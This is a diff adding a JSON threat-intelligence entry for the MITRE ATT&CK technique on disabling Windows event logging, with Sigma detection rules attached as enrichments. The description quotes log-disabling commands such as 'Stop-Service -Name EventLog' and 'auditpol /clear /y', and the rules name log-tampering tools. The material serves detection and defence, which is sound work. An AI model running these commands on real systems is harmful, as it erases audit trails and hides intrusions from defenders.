@@ -1,0 +1,411 @@
+{
+    "id": "T1562.002",
+    "name": "Disable Windows Event Logging",
+    "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to `Security SettingsLocal PoliciesAudit Policy` for basic audit policy settings or `Security SettingsAdvanced Audit Policy Configuration` for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) `auditpol.exe` may also be used to set audit policies.(Citation: auditpol)\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: `Stop-Service -Name EventLog`.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use `auditpol` and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the `/success` or `/failure` parameters. For example, `auditpol /set /category:”Account Logon” /success:disable /failure:disable` turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: `auditpol /clear /y` or `auditpol /remove /allusers`.(Citation: T1562.002_redcanaryco)\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "Process: Process Creation, Script: Script Execution, Windows Registry: Windows Registry Key Creation, Application Log: Application Log Content, Sensor Health: Host Status, Command: Command Execution",
+    "detection": "Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)\nIn Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControl`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)",
+    "url": "https://attack.mitre.org/techniques/T1562/002",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "4d7cda18-1b12-4e52-b45c-d28653210df8",
+                    "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+                    "e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e",
+                    "2f78da12-f7c7-430b-8b19-a28f269b77a3",
+                    "0cb8d736-995d-4ce7-a31e-1e8d452a1459",
+                    "69aeb277-f15f-4d2d-b32a-55e883609563",
+                    "7d9263bd-dc47-4a58-bc92-5474abab390c",
+                    "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
+                    "166e9c50-8cd9-44af-815d-d1f0c0e90dde",
+                    "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                    "bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c",
+                    "d29ada0f-af45-4f27-8f32-f7b77c3dbc4e",
+                    "0a13e132-651d-11eb-ae93-0242ac130002",
+                    "49329257-089d-46e6-af37-4afce4290685",
+                    "b916cba1-b38a-42da-9223-17114d846fd6",
+                    "4eb28bed-d11a-4641-9863-c2ac017d910a",
+                    "65236ec7-ace0-4f0c-82fd-737b04fd4dcb"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "4d7cda18-1b12-4e52-b45c-d28653210df8",
+                        "lookup_data": {
+                            "description": "Detect possible Sysmon driver unload",
+                            "raw": "author: Kirill Kiryanov, oscd.community\ndate: 2019/10/23\ndescription: Detect possible Sysmon driver unload\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - unload\n    - sys\n    Image|endswith: \\fltmc.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- Details\nid: 4d7cda18-1b12-4e52-b45c-d28653210df8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1070\n- attack.t1562\n- attack.t1562.002\ntitle: Sysmon Driver Unload\n",
+                            "sigma:id": "4d7cda18-1b12-4e52-b45c-d28653210df8",
+                            "title": "Sysmon Driver Unload",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+                        "lookup_data": {
+                            "description": "Detects clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others).",
+                            "raw": "author: Ecco, Daniil Yugoslavskiy, oscd.community, D3F7A5105\ndate: 2019/09/26\ndescription: Detects clearing or configuration of eventlogs using wevtutil, powershell\n  and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others).\ndetection:\n  condition: 1 of selection_* and not 1 of filter_*\n  filter_msiexec:\n    CommandLine|contains: ' sl '\n    ParentImage:\n    - C:\\Windows\\SysWOW64\\msiexec.exe\n    - C:\\Windows\\System32\\msiexec.exe\n  selection_other_ps:\n    CommandLine|contains:\n    - 'Clear-EventLog '\n    - 'Remove-EventLog '\n    - 'Limit-EventLog '\n    - 'Clear-WinEvent '\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  selection_other_wmic:\n    CommandLine|contains: ' ClearEventLog '\n    Image|endswith: \\wmic.exe\n  selection_wevtutil:\n    CommandLine|contains:\n    - 'clear-log '\n    - ' cl '\n    - 'set-log '\n    - ' sl '\n    - 'lfn:'\n    Image|endswith: \\wevtutil.exe\nfalsepositives:\n- Admin activity\n- Scripts and administrative tools used in the monitored environment\n- Maintenance activity\nid: cc36992a-4671-4f21-a91d-6c2b72a2edf5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/18\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.001/T1070.001.md\n- https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html\n- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\n- https://gist.github.com/fovtran/ac0624983c7722e80a8f5a4babb170ee\n- https://jdhnet.wordpress.com/2017/12/19/changing-the-location-of-the-windows-event-logs/\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1070.001\n- attack.t1562.002\n- car.2016-04-002\ntitle: Suspicious Eventlog Clear or Configuration Change\n",
+                            "sigma:id": "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+                            "title": "Suspicious Eventlog Clear or Configuration Change",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e",
+                        "lookup_data": {
+                            "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)",
+                            "raw": "author: frack113\ndate: 2022/01/09\ndescription: Disables HTTP logging on a Windows IIS web server as seen by Threat Group\n  3390 (Bronze Union)\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - set\n    - config\n    - section:httplogging\n    - dontLog:true\n  selection_img:\n  - Image|endswith: \\appcmd.exe\n  - OriginalFileName: appcmd.exe\nfalsepositives:\n- Unknown\nid: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/22\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Disable Windows IIS HTTP Logging\n",
+                            "sigma:id": "e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e",
+                            "title": "Disable Windows IIS HTTP Logging",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2f78da12-f7c7-430b-8b19-a28f269b77a3",
+                        "lookup_data": {
+                            "description": "Detects tampering with the \"Enabled\" registry key in order to disable windows logging of a windows event channel",
+                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/07/04\ndescription: Detects tampering with the \"Enabled\" registry key in order to disable\n  windows logging of a windows event channel\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_empty:\n    Image:\n    - ''\n    - null\n  filter_iis:\n    Image|endswith: \\TiWorker.exe\n    Image|startswith: C:\\Windows\\winsxs\\\n  filter_svchost:\n    Image: C:\\Windows\\System32\\svchost.exe\n    TargetObject|contains:\n    - \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-FileInfoMinifilter\n    - \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-ASN1\\\n    - \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Kernel-AppCompat\\\n    - \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Runtime\\Error\\\n  filter_trusted_installer:\n    Image: C:\\Windows\\servicing\\TrustedInstaller.exe\n    TargetObject|contains: \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Compat-Appraiser\n  filter_wevutil:\n    Image|endswith: \\Windows\\system32\\wevtutil.exe\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|endswith: \\Enabled\n    TargetObject|startswith: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\\nfalsepositives:\n- Legitimate administrators disabling specific event log for troubleshooting\nid: 2f78da12-f7c7-430b-8b19-a28f269b77a3\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/18\nreferences:\n- https://twitter.com/WhichbufferArda/status/1543900539280293889\n- https://github.com/DebugPrivilege/CPP/blob/c39d365617dbfbcb01fffad200d52b6239b2918c/Windows%20Defender/RestoreDefenderConfig.cpp\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Disable Windows Event Logging Via Registry\n",
+                            "sigma:id": "2f78da12-f7c7-430b-8b19-a28f269b77a3",
+                            "title": "Disable Windows Event Logging Via Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0cb8d736-995d-4ce7-a31e-1e8d452a1459",
+                        "lookup_data": {
+                            "description": "Detects tampering with EventLog service \"file\" key. In order to change the default location of an Evtx file. This technique is used to tamper with log collection and alerting",
+                            "raw": "author: D3F7A5105\ndate: 2023/01/02\ndescription: Detects tampering with EventLog service \"file\" key. In order to change\n  the default location of an Evtx file. This technique is used to tamper with log\n  collection and alerting\ndetection:\n  condition: selection and not filter\n  filter:\n    Details|contains: \\System32\\Winevt\\Logs\\\n  selection:\n    EventType: SetValue\n    TargetObject|contains: \\SYSTEM\\CurrentControlSet\\Services\\EventLog\\\n    TargetObject|endswith: \\File\nfalsepositives:\n- Unknown\nid: 0cb8d736-995d-4ce7-a31e-1e8d452a1459\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Potential EventLog File Location Tampering\n",
+                            "sigma:id": "0cb8d736-995d-4ce7-a31e-1e8d452a1459",
+                            "title": "Potential EventLog File Location Tampering",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "69aeb277-f15f-4d2d-b32a-55e883609563",
+                        "lookup_data": {
+                            "description": "Detects scenarios where system auditing (ie: windows event log auditing) is disabled.\nThis may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed.\nAlso, it is recommended to turn off \"Local Group Policy Object Processing\" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \"gpedit.msc\".\nPlease note, that disabling \"Local Group Policy Object Processing\" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.\n",
+                            "raw": "author: '@neu5ron'\ndate: 2017/11/19\ndescription: 'Detects scenarios where system auditing (ie: windows event log auditing)\n  is disabled.\n\n  This may be used in a scenario where an entity would want to bypass local logging\n  to evade detection when windows event logging is enabled and reviewed.\n\n  Also, it is recommended to turn off \"Local Group Policy Object Processing\" via GPO,\n  which will make sure that Active Directory GPOs take precedence over local/edited\n  computer policies via something such as \"gpedit.msc\".\n\n  Please note, that disabling \"Local Group Policy Object Processing\" may cause an\n  issue in scenarios of one off specific GPO modifications -- however it is recommended\n  to perform these modifications in Active Directory anyways.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    AuditPolicyChanges|contains:\n    - '%%8448'\n    - '%%8450'\n    EventID: 4719\nfalsepositives:\n- Unknown\nid: 69aeb277-f15f-4d2d-b32a-55e883609563\nlevel: high\nlogsource:\n  definition: 'Requirements: Audit Policy : Computer Management > Audit Policy Configuration,\n    Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced\n    Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy\n    Change'\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Disabling Windows Event Auditing\n",
+                            "sigma:id": "69aeb277-f15f-4d2d-b32a-55e883609563",
+                            "title": "Disabling Windows Event Auditing",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7d9263bd-dc47-4a58-bc92-5474abab390c",
+                        "lookup_data": {
+                            "description": "Detects tampering with the \"ChannelAccess\" registry key in order to change access to windows event channel",
+                            "raw": "author: frack113\ndate: 2022/09/17\ndescription: Detects tampering with the \"ChannelAccess\" registry key in order to change\n  access to windows event channel\ndetection:\n  condition: selection and not 1 of filter*\n  filter_ti_worker:\n    Image|endswith: \\TiWorker.exe\n  filter_trustedinstaller:\n    Image: C:\\Windows\\servicing\\TrustedInstaller.exe\n  selection:\n    Details|contains:\n    - (A;;0x1;;;SY)\n    - (A;;0x5;;;BA)\n    - (A;;0x1;;;LA)\n    EventType: SetValue\n    TargetObject|endswith: \\ChannelAccess\n    TargetObject|startswith: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\\nfalsepositives:\n- Unknown\nid: 7d9263bd-dc47-4a58-bc92-5474abab390c\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/29\nreferences:\n- https://app.any.run/tasks/77b2e328-8f36-46b2-b2e2-8a80398217ab/\n- https://learn.microsoft.com/en-us/windows/win32/api/winevt/\n- https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Change Winevt Event Access Permission Via Registry\n",
+                            "sigma:id": "7d9263bd-dc47-4a58-bc92-5474abab390c",
+                            "title": "Change Winevt Event Access Permission Via Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
+                        "lookup_data": {
+                            "description": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
+                            "raw": "author: Nasreddine Bencherchali @nas_bench\ndate: 2021/12/18\ndescription: 'Threat actors can use an older version of the auditpol binary available\n  inside the NT resource kit to change audit policy configuration to impair detection\n  capability.\n\n  This can be carried out by selectively disabling/removing certain audit policies\n  as well as restoring a custom policy owned by the threat actor.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /logon:none\n    - /system:none\n    - /sam:none\n    - /privilege:none\n    - /object:none\n    - /process:none\n    - /policy:none\nfalsepositives:\n- Unknown\nid: c6c56ada-612b-42d1-9a29-adad3c5c2c1e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Suspicious NT Resource Kit Auditpol Usage\n",
+                            "sigma:id": "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
+                            "title": "Suspicious NT Resource Kit Auditpol Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "166e9c50-8cd9-44af-815d-d1f0c0e90dde",
+                        "lookup_data": {
+                            "description": "Detects potential access to svchost process memory such as that used by Invoke-Phantom to kill the winRM windows event logging service.",
+                            "raw": "author: Tim Burrell\ndate: 2020/01/02\ndescription: Detects potential access to svchost process memory such as that used\n  by Invoke-Phantom to kill the winRM windows event logging service.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_msbuild:\n    CallTrace|contains:\n    - Microsoft.Build.ni.dll\n    - System.ni.dll\n    SourceImage|endswith: \\MSBuild\\Current\\Bin\\MSBuild.exe\n    SourceImage|startswith: C:\\Program Files\\Microsoft Visual Studio\\\n  selection:\n    CallTrace|contains: UNKNOWN\n    GrantedAccess: '0x1F3FFF'\n    TargetImage|endswith: \\WINDOWS\\System32\\svchost.exe\nfalsepositives:\n- Unknown\nid: 166e9c50-8cd9-44af-815d-d1f0c0e90dde\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/hlldz/Invoke-Phant0m\n- https://twitter.com/timbmsft/status/900724491076214784\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Potential Svchost Memory Access\n",
+                            "sigma:id": "166e9c50-8cd9-44af-815d-d1f0c0e90dde",
+                            "title": "Potential Svchost Memory Access",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                        "lookup_data": {
+                            "description": "Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy",
+                            "raw": "author: Janantha Marasinghe\ndate: 2022/11/18\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting\n  or modifying the security policy\ndetection:\n  condition: selection_img and (1 of selection_flags_*)\n  selection_flags_configure:\n    CommandLine|contains|all:\n    - /configure\n    - /db\n  selection_flags_discovery:\n    CommandLine|contains|all:\n    - /export\n    - /cfg\n  selection_img:\n  - Image|endswith: \\secedit.exe\n  - OriginalFileName: SeCEdit\nfalsepositives:\n- Legitimate administrative use\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nstatus: experimental\ntags:\n- attack.discovery\n- attack.persistence\n- attack.defense_evasion\n- attack.credential_access\n- attack.privilege_escalation\n- attack.t1562.002\n- attack.t1547.001\n- attack.t1505.005\n- attack.t1556.002\n- attack.t1562\n- attack.t1574.007\n- attack.t1564.002\n- attack.t1546.008\n- attack.t1546.007\n- attack.t1547.014\n- attack.t1547.010\n- attack.t1547.002\n- attack.t1557\n- attack.t1082\ntitle: Potential Suspicious Activity Using SeCEdit\n",
+                            "sigma:id": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                            "title": "Potential Suspicious Activity Using SeCEdit",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c",
+                        "lookup_data": {
+                            "description": "Detects the use of SharpEvtHook, a tool to tamper with Windows event logs",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/07\ndescription: Detects the use of SharpEvtHook, a tool to tamper with Windows event\n  logs\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\SharpEvtMute.exe\n  - Description: SharpEvtMute\n  - CommandLine|contains:\n    - '--Filter \"rule '\n    - --Encoded --Filter \\\"\nfalsepositives:\n- Unknown\nid: bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/bats3c/EvtMute\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: SharpEvtMute EvtMuteHook Load\n",
+                            "sigma:id": "bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c",
+                            "title": "SharpEvtMute EvtMuteHook Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d29ada0f-af45-4f27-8f32-f7b77c3dbc4e",
+                        "lookup_data": {
+                            "description": "Detects the use of SysmonEnte, a tool to attack the integrity of Sysmon",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/07\ndescription: Detects the use of SysmonEnte, a tool to attack the integrity of Sysmon\ndetection:\n  condition: ( selection_1 and not 1 of filter_* ) or selection_calltrace\n  filter_1:\n    SourceImage|startswith:\n    - C:\\Program Files\n    - C:\\Windows\\System32\\\n  filter_msdefender:\n    SourceImage|endswith: \\MsMpEng.exe\n    SourceImage|startswith: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\n  selection_1:\n    GrantedAccess: '0x1400'\n    TargetImage: C:\\Windows\\Sysmon64.exe\n  selection_calltrace:\n    CallTrace: Ente\nfalsepositives:\n- Unknown\nid: d29ada0f-af45-4f27-8f32-f7b77c3dbc4e\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/09/09\nreferences:\n- https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html\n- https://github.com/codewhitesec/SysmonEnte/\n- https://github.com/codewhitesec/SysmonEnte/blob/main/screens/1.png\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: SysmonEnte Usage\n",
+                            "sigma:id": "d29ada0f-af45-4f27-8f32-f7b77c3dbc4e",
+                            "title": "SysmonEnte Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0a13e132-651d-11eb-ae93-0242ac130002",
+                        "lookup_data": {
+                            "description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
+                            "raw": "author: Janantha Marasinghe (https://github.com/blueteam0ps)\ndate: 2021/02/02\ndescription: 'Threat actors can use auditpol binary to change audit policy configuration\n  to impair detection capability.\n\n  This can be carried out by selectively disabling/removing certain audit policies\n  as well as restoring a custom policy owned by the threat actor.\n\n  '\ndetection:\n  condition: selection_auditpol_binary and selection_auditpol_command\n  selection_auditpol_binary:\n    Image|endswith: \\auditpol.exe\n  selection_auditpol_command:\n    CommandLine|contains:\n    - disable\n    - clear\n    - remove\n    - restore\nfalsepositives:\n- Admin activity\nid: 0a13e132-651d-11eb-ae93-0242ac130002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Suspicious Auditpol Usage\n",
+                            "sigma:id": "0a13e132-651d-11eb-ae93-0242ac130002",
+                            "title": "Suspicious Auditpol Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "49329257-089d-46e6-af37-4afce4290685",
+                        "lookup_data": {
+                            "description": "Detects the load of EvtMuteHook.dll, a key component of SharpEvtHook, a tool to tamper with Windows event logs",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/07\ndescription: Detects the load of EvtMuteHook.dll, a key component of SharpEvtHook,\n  a tool to tamper with Windows event logs\ndetection:\n  condition: selection\n  selection:\n  - Hashes|contains: IMPHASH=330768A4F172E10ACB6287B87289D83B\n  - Imphash: 330768a4f172e10acb6287b87289d83b\nfalsepositives:\n- Other DLLs with that import hash\nid: 49329257-089d-46e6-af37-4afce4290685\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/bats3c/EvtMute\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: SharpEvtMute Imphash EvtMuteHook Load\n",
+                            "sigma:id": "49329257-089d-46e6-af37-4afce4290685",
+                            "title": "SharpEvtMute Imphash EvtMuteHook Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b916cba1-b38a-42da-9223-17114d846fd6",
+                        "lookup_data": {
+                            "description": "Detects potential NT API stub patching as seen used by the project PatchingAPI",
+                            "raw": "author: frack113\ndate: 2023/01/07\ndescription: Detects potential NT API stub patching as seen used by the project PatchingAPI\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_dotnet:\n    SourceImage|endswith: \\NGenTask.exe\n    SourceImage|startswith:\n    - C:\\Windows\\Microsoft.NET\\Framework\\v\n    - C:\\Windows\\Microsoft.NET\\Framework64\\v\n    TargetImage|startswith:\n    - C:\\Windows\\Microsoft.NET\\Framework\\v\n    - C:\\Windows\\Microsoft.NET\\Framework64\\v\n  filter_generic:\n  - SourceImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n  - TargetImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n  filter_githubdesktop:\n    SourceImage|contains: \\AppData\\Local\\GitHubDesktop\\app-\n    SourceImage|endswith:\n    - \\GitHubDesktop.exe\n    - \\resources\\app\\git\\usr\\bin\\sh.exe\n    SourceImage|startswith: C:\\Users\\\n    TargetImage|contains: \\AppData\\Local\\GitHubDesktop\\app-\n    TargetImage|startswith: C:\\Users\\\n  filter_taskhost:\n    SourceImage:\n    - C:\\WINDOWS\\system32\\taskhostw.exe\n    - C:\\Windows\\system32\\taskhost.exe\n    TargetImage|endswith: \\NGenTask.exe\n    TargetImage|startswith:\n    - C:\\Windows\\Microsoft.NET\\Framework\\v\n    - C:\\Windows\\Microsoft.NET\\Framework64\\v\n  filter_teams_to_update:\n    SourceImage|endswith: \\AppData\\Local\\Microsoft\\Teams\\stage\\Teams.exe\n    SourceImage|startswith: C:\\Users\\\n    TargetImage|endswith: \\AppData\\Local\\Microsoft\\Teams\\Update.exe\n    TargetImage|startswith: C:\\Users\\\n  filter_teams_update_regsvr32:\n    SourceImage|endswith: \\AppData\\Local\\Microsoft\\Teams\\Update.exe\n    SourceImage|startswith: C:\\Users\\\n    TargetImage: C:\\WINDOWS\\SysWOW64\\regsvr32.exe\n  filter_teams_update_to_teams:\n    SourceImage|endswith: \\AppData\\Local\\Microsoft\\Teams\\Update.exe\n    SourceImage|startswith: C:\\Users\\\n    TargetImage|endswith: \\AppData\\Local\\Microsoft\\Teams\\stage\\Teams.exe\n  filter_thor:\n    SourceImage|endswith: \\thor64.exe\n    SourceImage|startswith: C:\\Windows\\Temp\\asgard2-agent\\\n  selection:\n    CallTrace|contains: '|UNKNOWN('\n    CallTrace|endswith: )\n    CallTrace|startswith: C:\\Windows\\SYSTEM32\\ntdll.dll+\n    GrantedAccess: '0x1FFFFF'\nfalsepositives:\n- Unknown\nid: b916cba1-b38a-42da-9223-17114d846fd6\nlevel: medium\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2023/01/25\nreferences:\n- https://github.com/D1rkMtr/UnhookingPatch\n- https://twitter.com/D1rkMtr/status/1611471891193298944?s=20\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: Potential NT API Stub Patching\n",
+                            "sigma:id": "b916cba1-b38a-42da-9223-17114d846fd6",
+                            "title": "Potential NT API Stub Patching",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4eb28bed-d11a-4641-9863-c2ac017d910a",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1562.002",
+                            "mitre-cti:description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: 